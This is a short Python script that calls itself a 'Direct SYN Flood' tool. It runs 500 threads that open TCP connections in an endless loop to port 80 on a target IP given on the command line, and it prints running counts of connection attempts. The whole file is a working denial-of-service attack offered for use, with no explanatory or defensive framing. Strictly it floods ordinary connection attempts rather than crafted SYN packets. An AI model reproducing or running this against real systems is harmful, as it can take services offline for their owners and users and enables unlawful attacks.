
#!/usr/bin/env python3

import socket
import sys
import random
import threading
import time

if len(sys.argv) != 2:
    print("Usage: sudo python3 syn.py <Target IP>")
    sys.exit(1)

TARGET_HOST = sys.argv[1]
PORT = 80
THREAD_COUNT = 500

total_attempts = 0

def update_counter():
    global total_attempts
    total_attempts += 1

def connect_once():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(False)
        result = s.connect_ex((TARGET_HOST, PORT))
        update_counter()
        time.sleep(10)  
    except Exception:
        pass

def flood_worker():
    while True:
        connect_once()
        time.sleep(0.01)

def show_status():
    global total_attempts
    prev_count = total_attempts
    while True:
        time.sleep(5)
        curr = total_attempts
        diff = curr - prev_count
        print(f"[SYN Stats] Attemping new conn/sec: {diff//5} | Totals So Far: {curr}")
        prev_count = curr


stat_thread = threading.Thread(target=show_status, daemon=True)
stat_thread.start()


threads = []
for i in range(THREAD_COUNT):
    thread = threading.Thread(target=flood_worker, daemon=True)
    thread.start()
    threads.append(thread)
    time.sleep(0.005)  

print(f"[ Launching Direct SYN Flood Against '{TARGET_HOST}' on port {PORT}]")
print(f"[ Active worker threads: {THREAD_COUNT}]")
print("[ Monitoring begins shortly...]\n")

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\nShutdown received. Ending all connections...")
    sys.exit(0)
